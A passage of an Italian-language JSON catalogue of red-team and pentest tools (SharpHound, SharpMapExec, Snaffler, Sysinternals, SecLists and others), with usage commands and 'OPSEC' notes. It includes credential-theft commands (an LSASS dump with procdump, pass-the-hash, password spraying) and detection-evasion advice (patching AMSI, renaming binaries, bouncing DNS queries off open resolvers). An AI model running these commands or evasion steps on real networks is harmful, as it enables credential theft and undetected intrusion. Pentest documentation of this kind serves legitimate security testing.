Escalation locale (es. servizi con path non quotati, AlwaysInstallElevated) e difese mancanti (es. no AV, no EDR).</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Lo script esegue letture massive del registro e WMI. Su sistemi con EDR avanzati, questo comportamento (simile a tool di enumeration offensivi come Seatbelt) potrebbe generare alert.</p><p><strong>Impatto operativo:</strong> Basso, attività di sola lettura.</p><p><strong>Mitigazioni:</strong> Se in contesto Red Team, leggere il codice e lanciare solo funzioni specifiche manualmente invece dell'intero script.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "00_Common",
      "Tools_Windows"
    ],
    "notes": null
  },
  {
    "id": "sharphound-exe",
    "name": "SharpHound.exe",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/SpecterOps/SharpHound",
    "desc": "Collector C# per BloodHound: mappa relazioni AD, ACL, sessioni utente e trust per identificare attack path complessi.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>SharpHound è il componente di raccolta dati (Ingestor) per BloodHound. Scritto in C#, è progettato per interrogare massivamente l'Active Directory ed estrarre le relazioni logiche tra utenti, gruppi, computer e container. I dati raccolti (formattati in JSON) vengono poi importati nel database Neo4j di BloodHound per visualizzare graficamente i percorsi di attacco che permettono di scalare privilegi o muoversi lateralmente nel dominio.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Enumerazione Strutturale:</strong> Scarica l'intera struttura del dominio (OU, gruppi, utenti), le relazioni di trust tra domini/foreste e le Group Policy. Utilizza LDAP per query efficienti e minimizzando il traffico.</p><p><strong>Analisi ACL & Sessioni:</strong> La vera potenza risiede nell'enumerare le Access Control List (chi può resettare la password di chi?) e le sessioni attive (dove è loggato l'Admin?). Per le sessioni, interroga i singoli host via RPC/NetBIOS (\"Session Loop\").</p><p><strong>Stealth & Optimization:</strong> Include opzioni per randomizzare i delay, escludere Domain Controller, criptare gli output e usare metodi di raccolta meno invasivi (es. solo DCOnly) per ridurre la visibilità.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Eseguire da una macchina joinata al dominio con un utente qualsiasi. L'opzione <code>-c All</code> è la più comune ma rumorosa.</p><pre><code># Raccolta completa standard\nSharpHound.exe -c All\n\n# Raccolta stealth (solo dati AD, niente connessioni agli host)\nSharpHound.exe -c DCOnly --randomizefilenames --encryptzip\n\n# Loop continuo per mappare sessioni (ogni 30 min per 2 ore)\nSharpHound.exe -c SessionLoop --loopduration 02:00:00 --loopinterval 00:30:00</code></pre><p>Caricare il file <code>.zip</code> generato nell'interfaccia grafica di BloodHound.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>È lo standard industriale per mappare il rischio di <strong>Lateral Movement</strong>. Fondamentale per rispondere a domande come: \"Da questa workstation compromessa, posso arrivare al Domain Admin?\". Utile anche ai difensori per identificare e rimuovere \"Dangerous Rights\" assegnati per errore a gruppi generici.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> L'enumerazione delle sessioni (metodo <code>All</code> o <code>Session</code>) tocca ogni host della rete, generando un \"port scan\" distribuito sulla porta 445 molto rumoroso. Defender for Identity rileva l'enum LDAP massiva.</p><p><strong>Mitigazioni:</strong> Usare <code>-c DCOnly</code> per restare quasi invisibili (solo traffico LDAP verso il DC). Evitare <code>SessionLoop</code> in ambienti monitorati. Eseguire da un IP in whitelist se possibile.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "AD_Windows",
      "Recon_Health"
    ],
    "notes": null
  },
  {
    "id": "sharpmapexec",
    "name": "SharpMapExec.exe",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/cube0x0/SharpMapExec",
    "desc": "Porting C# di CrackMapExec per post-exploitation: esegue spraying, check credenziali e comandi WMI/SMB/WinRM nativamente.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>SharpMapExec è una riscrittura in C# del popolare CrackMapExec (CME). Nasce per offrire le stesse capacità di network sweeping e lateral movement in un formato eseguibile nativo (.NET assembly), ideale per essere eseguito via Cobalt Strike `execute-assembly` o altri C2 framework, bypassando la necessità di proxyare traffico o installare Python/dipendenze sul target compromesso.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Living off the Land:</strong> Sfrutta le librerie native di Windows per le comunicazioni di rete, riducendo le dipendenze esterne. Esegue autenticazioni NTLM/Kerberos per validare credenziali su ampi range di IP.</p><p><strong>Esecuzione Comandi:</strong> Supporta diverse strategie di esecuzione remota (WMI, SMB, WinRM) per lanciare payload o comandi di ricognizione su host multipli contemporaneamente.</p><p><strong>Enumerazione:</strong> Raccoglie informazioni vitali come share accessibili, sessioni utente attive, drive mappati e gruppi locali amministrativi.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>La sintassi cerca di specchiare quella di CME per facilitare la transizione.</p><pre><code># Password Spraying su subnet\nSharpMapExec.exe smb /targets:192.168.1.0/24 /user:admin /password:pass\n\n# Pass-the-Hash e check privilegi admin\nSharpMapExec.exe wmi /targets:servers.txt /user:admin /ntlm:hash /check\n\n# Esecuzione comando su target multipli\nSharpMapExec.exe winrm /targets:10.0.0.50 /user:user /pass:pass /exec:\"ipconfig /all\"</code></pre><p>Gli argomenti possono essere abbreviati e il tool gestisce output colorato per evidenziare successi (Pwn3d!).</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Perfetto per il <strong>Lateral Movement</strong> in scenari dove si opera da un beacon in memoria e non si può usare SOCKS proxy. Permette di \"pivotare\" rapidamente testando le credenziali dumpate contro altri host della rete interna direttamente dalla memoria del processo compromesso.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Soffre degli stessi problemi di CME: genera picchi di log di autenticazione. Inoltre, essendo un binario .NET non firmato, è soggetto a scansione AMSI al caricamento.</p><p><strong>Mitigazioni:</strong> Usare tramite `execute-assembly` dopo aver disabilitato/patchato AMSI. Evitare scansioni massive; preferire target list mirate.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "AD_Windows",
      "Lateral_Movement"
    ],
    "notes": null
  },
  {
    "id": "sharpview",
    "name": "SharpView.exe",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/tevora-threat/SharpView",
    "desc": "Porting .NET di PowerView: enumerazione Active Directory stealth eseguibile via C# per bypassare restrizioni PowerShell.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>SharpView è la reimplementazione in C# del leggendario PowerView. È stato creato per operare in ambienti dove PowerShell è monitorato (Script Block Logging) o limitato (Constrained Language Mode). Offre le stesse funzioni di ricognizione AD (User hunting, Group enum, Trust mapping) ma in un formato binario compilato, ideale per l'esecuzione \"in-memory\" tramite Cobalt Strike o altri C2.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>API Parity:</strong> Implementa quasi tutti i cmdlet di PowerView (<code>Get-DomainUser</code>, <code>Invoke-ShareFinder</code>, ecc.) mantenendo la stessa sintassi degli argomenti.</p><p><strong>Bypass AMSI:</strong> Essendo .NET assembly, è più facile da caricare eludendo le firme AMSI rispetto agli script .ps1 grezzi.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Eseguire come normale binario o via assembly loader.</p><pre><code># Enumerazione utenti con dettagli\nSharpView.exe Get-DomainUser -Properties samaccountname,description\n\n# Ricerca admin locali\nSharpView.exe Find-LocalAdminAccess</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Evasion & Recon:</strong> Quando <code>powershell.exe</code> è bloccato o allarma il SOC, SharpView permette di continuare la ricognizione situazionale del dominio utilizzando processi legittimi per caricare il codice .NET.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Sebbene eviti PS, genera comunque traffico LDAP/RPC verso il DC analizzabile da Defender for Identity. Il binario su disco è firmato come hacktool.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "AD_Windows",
      "Recon_Health"
    ],
    "notes": null
  },
  {
    "id": "snaffler",
    "name": "Snaffler.exe",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/SnaffCon/Snaffler",
    "desc": "Scanner avanzato per share SMB che identifica file sensibili (password, chiavi SSH, config) tramite pattern matching e regex.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Snaffler è uno strumento di \"caccia al tesoro\" automatizzata per ambienti Active Directory. Scansiona le share di rete accessibili (SYSVOL, netlogon, file server) alla ricerca di dati sensibili che gli amministratori o gli utenti hanno lasciato incustoditi. Utilizza un motore di regole sofisticato per distinguere tra file spazzatura e vere credenziali, chiavi private, backup di database o file di configurazione con password in chiaro.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Discovery Intelligente:</strong> Non si limita a cercare nomi di file. Ispeziona il contenuto dei file (fino a una certa dimensione) cercando pattern regex di credenziali, stringhe di connessione SQL, token API e altro.</p><p><strong>Riduzione Rumore:</strong> Il suo punto di forza è la capacità di scartare falsi positivi (es. file .xml di esempio) e classificare i ritrovamenti per livello di gravità (Nero, Rosso, Giallo, Verde), permettendo al pentester di focalizzarsi solo sui dati critici.</p><p><strong>Velocità:</strong> Fortemente multithreaded, può processare terabyte di dati distribuiti su centinaia di share in tempi ridotti.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Richiede di essere eseguito da un utente di dominio. L'output a video è molto verboso, quindi è essenziale loggare su file.</p><pre><code># Scansione standard (molto rumorosa a video)\nSnaffler.exe -s -o risultati.log\n\n# Scansione mirata su computer specifici con output dettagliato\nSnaffler.exe -n -i computers.txt -o snaffler.log -v data\n\n# Analisi dei risultati (live triage)\nGet-Content snaffler.log -Wait | Select-String \"^(\\{Black\\}|\\{Red\\})\"</code></pre><p>Le tag <code>{Black}</code> indicano ritrovamenti critici certi (es. file id_rsa senza password), <code>{Red}</code> alta probabilità di credenziali.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Durante la <strong>Post-Exploitation</strong>, spesso fornisce la chiave per il dominio (es. un file <code>web.config</code> con password di sa o un backup di AD). In fase di <strong>Audit/Cleanup</strong>, aiuta le aziende a identificare e rimuovere dati sensibili esposti a tutti gli utenti del dominio.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Genera un traffico SMB di lettura massivo. Può saturare la banda se non limitato. I sistemi DLP o di monitoraggio file server noteranno l'accesso a migliaia di file in breve tempo.</p><p><strong>Impatto operativo:</strong> Alto consumo di IOPS sui file server.</p><p><strong>Mitigazioni:</strong> Eseguire in orari non lavorativi. Usare opzioni per limitare il numero di thread o escludere share molto grandi/sensibili.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "AD_Windows",
      "Lateral_Movement"
    ],
    "notes": null
  },
  {
    "id": "sysinternals-suite",
    "name": "SysinternalsSuite",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://learn.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite",
    "desc": "Suite ufficiale Microsoft di utility avanzate per troubleshooting, analisi processi, forensics e gestione remota (PsExec, ProcMon, Sysmon).",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>La Sysinternals Suite è una collezione di oltre 70 utility di sistema create da Mark Russinovich (Microsoft). Sebbene nate per amministrazione e debugging, sono armi a doppio taglio fondamentali sia per attaccanti (per movimento laterale, persistenza e evasione) che per difensori (per analisi forense, monitoraggio e rilevamento malware). Essendo firmate digitalmente da Microsoft, spesso bypassano controlli di whitelisting basilari.</p><br><hr><h4 class=\"rt-purple\">Tool Chiave per Security</h4><p><strong>PsExec:</strong> Lo standard per l'esecuzione remota. Permette di lanciare processi su altri sistemi (via SMB/RPC) con privilegi SYSTEM, usato massivamente per lateral movement.</p><p><strong>ProcDump:</strong> Utility da riga di comando per il monitoraggio dei crash, abusata dagli attaccanti per eseguire il dump della memoria del processo LSASS (<code>lsass.exe</code>) e estrarre credenziali senza usare Mimikatz, spesso evadendo gli AV.</p><p><strong>Sysmon:</strong> Strumento difensivo che installa un driver per loggare attività dettagliate di sistema (creazione processi, connessioni di rete, modifica file) nel registro eventi, essenziale per il threat hunting moderno.</p><p><strong>Autoruns & ProcMon:</strong> Fondamentali per analisi forense statica e dinamica, permettono di individuare meccanismi di persistenza (chiavi di registro, servizi, task) e tracciare l'attività real-time di malware.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>La suite è composta da eseguibili standalone portabili.</p><pre><code># PsExec: Shell interattiva remota come SYSTEM\npsexec.exe \\\\192.168.1.50 -u Administrator -p Pass -s cmd.exe\n\n# ProcDump: Dump memoria LSASS (richiede Admin)\nprocdump.exe -accepteula -ma lsass.exe lsass.dmp\n\n# Sysmon: Installazione con configurazione xml\nsysmon.exe -accepteula -i config.xml</code></pre><p>È possibile usare la versione live web senza download tramite il path UNC: <code>\\\\live.sysinternals.com\\tools\\toolname.exe</code> (se l'accesso internet è permesso).</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In <strong>Red Teaming</strong>, PsExec è il metodo classico per spostarsi dopo aver ottenuto credenziali admin.</p><p>ProcDump è la tecnica \"Living off the Land\" preferita per il credential harvesting. In <strong>Incident Response</strong>, Process Explorer e Autoruns sono i primi tool lanciati su una macchina sospetta per identificare processi anomali.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> PsExec lascia tracce evidenti (servizio PSEXESVC, Event ID 7045). ProcDump su LSASS è una firma nota per gli EDR. L'uso di <code>live.sysinternals.com</code> genera traffico WebDAV sospetto in uscita.</p><p><strong>Mitigazioni:</strong> Rinominare gli eseguibili (es. <code>pd.exe</code> per ProcDump). Usare varianti di PsExec (come quello di Impacket o CS) che offrono più controllo. Non eseguire mai tool direttamente dal web server Microsoft in un engagement stealth.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "00_Common",
      "Tools_Windows"
    ],
    "notes": null
  },
  {
    "id": "wordlist-paroleitaliane",
    "name": "Parole Italiane",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/napolux/paroleitaliane",
    "desc": "Collezione di wordlist mirate per l'Italia: nomi, cognomi, città e termini comuni per password spraying efficace.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Questa risorsa è una raccolta di dizionari ottimizzati per target italiani. A differenza di wordlist internazionali come RockYou, contiene termini culturalmente specifici (squadre di calcio, nomi di città, mesi in italiano, nomi propri diffusi) che compongono la maggior parte delle password aziendali in Italia. Essenziale per aumentare il tasso di successo nel cracking e nello spraying.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Liste Nomi/Cognomi:</strong> Fondamentali per generare liste di username aziendali (es. <code>m.rossi</code>) o per attacchi a dizionario ibridi.</p><p><strong>Pattern Comuni:</strong> Include parole base che, combinate con regole di mutazione (aggiunta di anno e punto esclamativo), coprono una vasta percentuale di password utente (es. \"Napoli2023!\").</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Da usare come input per tool di cracking.</p><pre><code># Generazione username con regole\nusername-anarchy -i nomi.txt cognomi.txt > userlist.txt\n\n# Cracking Hashcat con regole best64\nhashcat -m 1000 hash.txt parole_italiane.txt -r rules/best64.rule</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Red Teaming Italia:</strong> Inutile usare dizionari inglesi contro un'azienda di PA italiana. L'uso di queste liste riduce il tempo di cracking e aumenta i successi nello spraying.</p><br><hr><h4 class=\"rt-red\">Considerazioni</h4><p>Mantenere le liste aggiornate con termini recenti (es. vincitori scudetto, eventi correnti).</p><br><hr>",
    "best_in": true,
    "category_path": [
      "00_Common",
      "Wordlists"
    ],
    "notes": null
  },
  {
    "id": "wordlist-payloadsallthethings-4-2",
    "name": "PayloadsAllTheThings",
    "version": "4.2",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/swisskyrepo/PayloadsAllTheThings",
    "desc": "Repository enciclopedico di payload, bypass, cheat sheet e guide per exploitation web, privilege escalation e metodologie di pentest.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>PayloadsAllTheThings</strong> non è un singolo eseguibile, ma una risorsa di conoscenza strutturata essenziale per ogni pentester. È un repository che aggrega le tecniche più efficaci, payload di fuzzing, one-liners per reverse shell e guide passo-passo per sfruttare vulnerabilità specifiche (SQLi, XSS, XXE, SSRF, ecc.). Serve come riferimento rapido durante le operazioni per adattare gli attacchi al contesto specifico.</p><br><hr><h4 class=\"rt-purple\">Contenuti principali</h4><p><strong>Web Exploitation:</strong> Liste esaustive di payload per bypassare filtri WAF in attacchi SQL Injection, XSS poliglotti, RCE e Template Injection. Include tecniche per scenari complessi come la deserializzazione insicura in vari linguaggi.</p><p><strong>Methodology & Cheat Sheets:</strong> Guide concise per fasi specifiche: \"Linux Privilege Escalation\", \"Active Directory Methodology\", \"Cloud Hacking\" (AWS, Azure). Offre comandi pronti all'uso per enumerazione ed exploit.</p><p><strong>Intruder Payloads:</strong> Wordlist ottimizzate per l'uso con Burp Suite Intruder, pensate per fuzzare parametri specifici e provocare errori o comportamenti anomali nelle applicazioni target.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Questa risorsa si consulta principalmente via browser o clonando la repo localmente per grep rapidi.</p><pre><code># Clonazione per uso offline\ngit clone https://github.com/swisskyrepo/PayloadsAllTheThings.git\n\n# Ricerca rapida di una reverse shell Python\ngrep -r \"python\" PayloadsAllTheThings/Methodology\\ and\\ Resources/Reverse\\ Shell\\ Cheatsheet.md</code></pre><p>I payload vanno copiati e adattati manualmente (es. cambiando IP/Porta o encoding) prima dell'iniezione nel target.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Quando un exploit standard fallisce a causa di un filtro o di una configurazione particolare, PATT fornisce varianti alternative (es. encoding diversi, metodi di concatenazione stringhe) per tentare il bypass. È la risorsa primaria per costruire <strong>fuzzing list customizzate</strong> durante il testing di applicazioni web robuste.</p><br><hr><h4 class=\"rt-red\">Considerazioni</h4><p>L'uso cieco di payload presi da repository pubblici può essere pericoloso (es. payload che fanno crashare il servizio invece di testarlo) o inefficace. Comprendere sempre cosa fa il codice prima di iniettarlo, specialmente in ambienti di produzione.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "00_Common",
      "Wordlists"
    ],
    "notes": null
  },
  {
    "id": "wordlist-portswigger",
    "name": "PortSwigger",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/PortSwigger/wordlist-extractor",
    "desc": "Wordlist e utility ecosistema Burp Suite per content discovery, fuzzing parametri e integration con Intruder/Extender",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>PortSwigger Wordlists</strong> è una collezione di utility e dizionari integrati nell'ecosistema Burp Suite. Include tool per estrarre/generare wordlist da asset dell'applicazione target e alimentarli direttamente in Burp Intruder ed extensions.</p><br><hr><h4 class=\"rt-purple\">Componenti</h4><p><strong>Wordlist Extractor:</strong> Tool per generare wordlist custom da:</p><ul><li>Response bodies di richieste Burp</li><li>File JavaScript e source maps</li><li>Commenti HTML e metadata</li><li>API responses e strutture JSON</li></ul><p><strong>Built-in wordlists:</strong> Burp Suite include dizionari predefiniti per:</p><ul><li>Username/password comuni</li><li>Directory e filename</li><li>Fuzzing parametri</li><li>Estensioni di file backup</li></ul><br><hr><h4 class=\"rt-green\">Integration Workflow</h4><p><strong>1. Estrazione context-aware:</strong> Durante il proxy browsing, catturare richieste e usare wordlist extractor per generare dizionari basati sulle naming conventions osservate.</p><p><strong>2. Intruder payloads:</strong> Importare wordlist custom in Burp Intruder payload sets per fuzzing mirato di directory, parametri, header.</p><p><strong>3. Content Discovery:</strong> Usare con Burp Scanner o Content Discovery extension per enumerazione di endpoint nascosti.</p><br><hr><h4 class=\"rt-amber\">Casi d'Uso</h4><p><strong>API testing:</strong> Estrarre pattern di endpoint da documentazione Swagger/OpenAPI catturata nel proxy.</p><p><strong>Parameter discovery:</strong> Generare lista parametri da analisi JavaScript per parameter pollution testing.</p><p><strong>Backup file hunting:</strong> Creare wordlist con estensioni e suffissi comuni (.bak, .old, .backup) combinati con filename osservati.</p><br><hr><h4 class=\"rt-red\">Best Practice</h4><p>Combinare wordlist PortSwigger con SecLists per coverage estesa. Usare payload processing rules in Intruder per encoding/encryption on-the-fly. Salvare wordlist generate per riuso su target simili. Integrare con Turbo Intruder extension per high-speed fuzzing su wordlist grandi.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "00_Common",
      "Wordlists"
    ],
    "notes": null
  },
  {
    "id": "wordlist-seclists-2025-2",
    "name": "SecLists",
    "version": "2025.2",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/danielmiessler/SecLists",
    "desc": "La collezione standard de-facto di wordlist per discovery, fuzzing e brute-force: username, password, URL, file sensibili e pattern payload.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>SecLists</strong> è l'archivio definitivo di liste utilizzate dai security tester. Raccoglie dizionari di password reali (es. RockYou), elenchi di username comuni, percorsi di file e directory per web discovery (es. raft, dirb), payload per fuzzing (XSS, SQLi) e molto altro. È la \"munizione\" per qualsiasi tool di brute-force o discovery automatico come Gobuster, wfuzz, Hydra o Burp Suite.</p><br><hr><h4 class=\"rt-purple\">Categorie principali</h4><p><strong>Discovery:</strong> Liste per enumerazione DNS (sottodomini), Web-Content (directory, file backup, admin panel), e parametri API. Include liste specifiche per tecnologie (CMS, IIS, Apache).</p><p><strong>Passwords & Usernames:</strong> Aggregazioni di leak storici, default credentials per dispositivi/software, e pattern comuni di username per password spraying.</p><p><strong>Fuzzing:</strong> Stringhe progettate per provocare crash o errori in applicazioni (buffer overflow patterns, format strings, caratteri speciali, LFI traversal).</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>SecLists viene usato come input per altri tool. Solitamente risiede in <code>/usr/share/seclists</code> su Kali/Parrot.</p><pre><code># Web Directory Brute-forcing con Gobuster\ngobuster dir -u http://target.com -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt\n\n# Password Spraying con Hydra\nhydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P password123 ssh://192.168.1.1\n\n# Fuzzing API con Wfuzz\nwfuzz -w /usr/share/seclists/Discovery/Web-Content/api/objects.txt -u http://api.target/FUZZ</code></pre><p>Selezionare la lista giusta per dimensione e contesto è cruciale per il successo e la velocità dell'attacco.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In ogni fase del pentest: dalla <strong>Recon</strong> (trovare sottodomini nascosti) all'<strong>Exploitation</strong> (indovinare credenziali admin o path di file vulnerabili). È essenziale per scoprire risorse non linkate (\"Security by Obscurity\").</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> L'uso di wordlist grandi genera migliaia di richieste in breve tempo (404 Not Found, 401 Unauthorized), facendo scattare immediatamente WAF, IPS e meccanismi di ban IP.</p><p><strong>Mitigazioni:</strong> Usare liste \"short\" o mirate prima di quelle massiva. Regolare il rate-limit dei tool utilizzati.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "00_Common",
      "Wordlists"
    ],
    "notes": null
  },
  {
    "id": "subbrute-77",
    "name": "subbrute-77",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/TheRook/subbrute",
    "desc": "Variante del tool SubBrute per enumerazione sottodomini tramite DNS ricorsivo aperto, utile per bypassare rate-limit.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>SubBrute è uno strumento di enumerazione sottodomini che si distingue per l'uso di una catena di resolver DNS aperti come proxy. Invece di inviare richieste direttamente dal proprio IP al nameserver autoritativo del target, SubBrute fa rimbalzare le query attraverso resolver pubblici vulnerabili/aperti. Questo non solo maschera l'origine dell'attacco, ma permette di aggirare i rate-limit imposti dal target.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Resolver Chain:</strong> Utilizza una lista di resolver aperti per distribuire il carico delle query.</p><p><strong>Recursive Crawling:</strong> Capace di enumerare record DNS ricorsivamente per trovare sottodomini profondi.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Python script.</p><pre><code># Enumerazione con wordlist default\npython subbrute.py target.com\n\n# Uso lista resolver custom\npython subbrute.py -r resolvers.txt target.com</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>External Recon Stealth:</strong> Quando si vuole mappare l'infrastruttura esterna senza bruciare il proprio IP o essere bloccati per troppe richieste DNS.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Il target vede traffico DNS provenire da molti IP diversi (i resolver), rendendo difficile il blocco basato su IP sorgente.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "DNS_Subdomains"
    ],
    "notes": null
  },
  {
    "id": "dirsearch",
    "name": "dirsearch",
    "version": "0.4.3",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/maurosoria/dirsearch",
    "desc": "Fuzzer web multi-thread veloce per discovery di directory, file nascosti e backup, con wordlist intelligenti e filtri.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Dirsearch</strong> è uno standard de facto per il web path bruteforcing scritto in Python. È progettato per la velocità e la facilità d'uso, permettendo di scoprire risorse nascoste (admin panel, file .git, backup .bak) su server web. Supporta il fuzzing ricorsivo, estensioni multiple e tecniche di evasione per ridurre i falsi positivi.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>High Performance:</strong> Gestisce thread multipli e keep-alive connection per massimizzare il throughput di richieste al secondo.</p><p><strong>Smart Detection:</strong> Rileva automaticamente pagine di \"Not Found\" customizzate e filtra le risposte in base a dimensione, status code o contenuto, riducendo il rumore.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Comando base per scansione con estensioni comuni.</p><pre><code># Scansione base con estensioni php,html,txt\npython3 dirsearch.py -u https://target.com -e php,html,txt\n\n# Scansione con wordlist custom e delay per stealth\npython3 dirsearch.py -u https://target.com -w /path/wordlist.txt -e * --delay 0.5</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Utilizzato in ogni <strong>Web Assessment</strong> dopo la ricognizione iniziale. Trovare un file <code>db_backup.sql.zip</code> o una cartella <code>/.git/</code> dimenticata dagli sviluppatori offre spesso un percorso diretto alla compromissione senza bisogno di exploit complessi.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Genera migliaia di errori 404. Estremamente rumoroso. WAF e meccanismi di ban IP (Fail2Ban) interverranno quasi subito se non configurato con rate-limit basso.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Web",
      "Content_Discovery"
    ],
    "notes": null
  },
  {
    "id": "aquatone-linux-amd64",
    "name": "aquatone_linux_amd64",
    "version": "1.7.0",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/michenriksen/aquatone",
    "desc": "Tool di ricognizione visiva che esegue screenshot automatici di domini multipli e clusterizza i risultati per rapida revisione.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Aquatone è uno strumento essenziale per la ricognizione web su larga scala. Quando si ha a che fare con centinaia di sottodomini, visitarli manualmente è impossibile. Aquatone utilizza browser headless (Chromium/Puppeteer) per visitare automaticamente ogni target, catturare uno screenshot, e raccogliere gli header di risposta. La sua potenza sta nel generare un report HTML visuale che raggruppa le pagine simili, permettendo all'analista di individuare a colpo d'occhio superfici d'attacco interessanti.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Visual Clustering:</strong> Analizza la struttura HTML e gli screenshot per raggruppare pagine identiche (es. pagine di default di IIS o Apache). Questo riduce il rumore, permettendo di ignorare centinaia di siti inutili e concentrarsi sulle deviazioni.</p><p><strong>Port Scanning Integration:</strong> Può importare direttamente output di Nmap o Masscan, o eseguire una scansione rapida delle porte web comuni (80, 443, 8000, 8080) prima di tentare lo screenshot.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Accetta input via pipe standard (es. lista di domini o URL).</p><pre><code># Pipeline tipica: Discovery -> Aquatone\ncat subdomains.txt | ./aquatone_linux_amd64 -ports large -out ./report</code></pre><p>Al termine, aprire il file <code>aquatone_report.html</code> nel browser per navigare i risultati.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In un <strong>External Infrastructure Assessment</strong>, Aquatone trasforma una lista di 5000 IP in una galleria navigabile, evidenziando immediatamente pannelli di login esposti, directory listing aperti o errori applicativi che espongono versioni software.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Genera traffico HTTP standard, ma con pattern riconoscibili se non si personalizza lo User-Agent. Navigare migliaia di URL in breve tempo può far scattare blocchi IP.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Web",
      "Fingerprinting",
      "Visual_Recon"
    ],
    "notes": null
  },
  {
    "id": "whatwaf-1-9",
    "name": "WhatWaf",
    "version": "1.9",
    "icon": "../app/icons/github.svg",
